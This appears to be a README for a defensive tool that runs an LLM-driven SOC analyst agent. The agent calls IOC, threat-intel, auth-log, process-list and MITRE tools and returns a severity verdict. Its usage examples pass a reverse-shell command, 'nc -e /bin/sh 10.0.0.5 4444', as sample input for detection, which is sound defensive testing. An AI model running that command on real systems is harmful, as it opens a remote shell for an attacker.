# soc-agent

An autonomous, tool-calling SOC analyst agent. Given a raw security incident
(alert text, log excerpts, an optional process list), it investigates the
incident itself — deciding which tools to call and in what order — rather
than running a single fixed pipeline, and concludes with a structured
verdict: severity, MITRE ATT&CK techniques, supporting IOCs, and recommended
next steps.

This is the "agentic pipeline" sibling to this repo's other triage tools:
[`log-triage-assistant`](../log-triage-assistant/) and
[`ioc-triage-assistant`](../ioc-triage-assistant/) each run a fixed
extract → correlate → summarize pipeline with a single LLM call for the
narrative. `soc-agent` instead gives an LLM a set of tools and lets it drive
a **multi-step investigation loop**, calling tools iteratively based on what
it finds, the same pattern used by production agent frameworks and by
Claude's own tool-use API.

## How the agent loop works

```
 user: "Investigate this incident: <text>"
   |
   v
 Claude (system prompt: you are a SOC analyst, tools below)
   |
   |-- decides to call extract_iocs(text)          --> tool result fed back
   |-- decides to call check_threat_intel(ip, ...)  --> tool result fed back
   |-- decides to call analyze_auth_log(log_text)   --> tool result fed back
   |-- decides to call check_process_list(procs)    --> tool result fed back
   |-- decides to call lookup_mitre_technique(id)   --> tool result fed back
   |
   v
 Claude calls submit_final_report(severity, summary, technique_ids, actions)
   |
   v
 loop stops, AgentReport returned
```

The model is never told *which* tools to call or in what order — only what
each tool does (see [`soc_agent/schemas.py`](soc_agent/schemas.py)) and that
it must call `submit_final_report` to conclude. It decides the investigation
path itself, which means it can skip irrelevant tools (e.g. no process list
provided) or call a tool multiple times (e.g. once per extracted indicator).

### Offline mode — no API key required

Without `ANTHROPIC_API_KEY` set (or without the `anthropic` package
installed), `SocAgent` falls back to a **deterministic planner** that calls
the exact same tool functions — `extract_iocs`, `check_threat_intel`,
`analyze_auth_log`, `check_process_list`, `lookup_mitre_technique` — in a
fixed, sensible order, and derives the same kind of verdict via explicit
rule-based scoring instead of an LLM decision. This means:

- The tool implementations are exercised identically whether or not an LLM
  is driving them, so they're one thing to test and trust.
- The whole agent is runnable, testable, and CI-friendly with zero network
  access or API cost.
- If a live investigation runs out of turns or the API call fails, the agent
  falls back to synthesizing a verdict from whatever the model *did* look up,
  using the same rule-based scorer — a partial investigation still produces
  a usable, deterministic report rather than an error.

Run `soc-agent investigate --file examples/sample_incident.txt` with no key
set to see this in action; every tool call in the trace is real, not
scripted output.

## Tools available to the agent

| Tool | Purpose |
|---|---|
| `extract_iocs` | Pull IPs, domains, and file hashes out of free text, including defanged indicators (`185[.]220[.]101[.]45`, `hxxp://`). Domains are filtered against a known-TLD list to avoid flagging filenames like `auth.log`. |
| `check_threat_intel` | Look up one indicator against a bundled local threat-intel feed (`data/threat_intel.json`). |
| `analyze_auth_log` | Correlated rule-based detection over auth-log text: brute force (≥4 failed logins from one source), likely compromise (failure burst then a success from the same source), privilege escalation (`sudo` activity). |
| `check_process_list` | Match observed process command lines against a ruleset for reverse shells, encoded PowerShell, credential-dumping tools, cron/scheduled-task persistence, and SUID/sudo abuse. |
| `lookup_mitre_technique` | Resolve a technique id to its name, tactic, and description (`data/mitre_techniques.json`). |
| `submit_final_report` *(terminating tool)* | Not an investigation tool — calling it is how the model signals "I'm done" and hands back its structured verdict. |

## Usage

```bash
pip install -e ".[llm]"   # anthropic SDK is optional; omit for offline-only use

# Live mode (needs ANTHROPIC_API_KEY)
export ANTHROPIC_API_KEY=sk-...
soc-agent investigate --file examples/sample_incident.txt

# Offline mode (no key needed)
soc-agent investigate --file examples/sample_incident.txt

# Include an observed process list
soc-agent investigate --file examples/sample_incident.txt \
  --processes "nc -e /bin/sh 10.0.0.5 4444,bash"

# Full structured report as JSON, including the tool-call trace
soc-agent investigate --file examples/sample_incident.txt --json
```

Or use it as a library:

```python
from soc_agent.agent import SocAgent

agent = SocAgent()  # live if ANTHROPIC_API_KEY is set, offline otherwise
report = agent.investigate(incident_text, processes=["nc -e /bin/sh 10.0.0.5 4444"])

print(report.severity)              # "critical"
print(report.technique_ids)         # ["T1059", "T1078", "T1110", ...]
print(report.trace[0].tool)         # "extract_iocs" — full investigation trace
```

## Design notes

- **Tools are plain, independently testable functions.** `soc_agent/tools.py`
  has no knowledge of the agent loop or the LLM — it's imported and unit
  tested directly in `tests/test_tools.py`.
- **The scoring/synthesis logic is shared**, not duplicated: both the offline
  planner and the live loop's "ran out of turns" fallback call the same
  `_score_severity` / `_build_summary` / `_build_recommended_actions`
  helpers in `soc_agent/agent.py`, over whatever tool outputs were gathered.
- **`submit_final_report` as a tool, not free-text parsing.** Rather than
  asking the model to end with a JSON blob and regex-parsing its prose, the
  verdict schema is itself a tool the model calls — Anthropic's structured
  tool-use guarantees the arguments match the schema.
- **Graceful degradation everywhere**: no API key → offline planner; API
  call fails mid-investigation → offline planner over the gathered evidence;
  model never concludes within `max_turns` → same rule-based synthesis over
  its partial trace. There is no path that returns nothing.

## Testing

```bash
pip install -e ".[dev]"
pytest
```

25 tests cover indicator extraction (including defanging and TLD
filtering), threat-intel lookups, auth-log correlation rules, process-list
rules, MITRE lookups, the offline planner's full investigation trace and
severity scoring, and the CLI's human and JSON output modes. All tests run
fully offline.
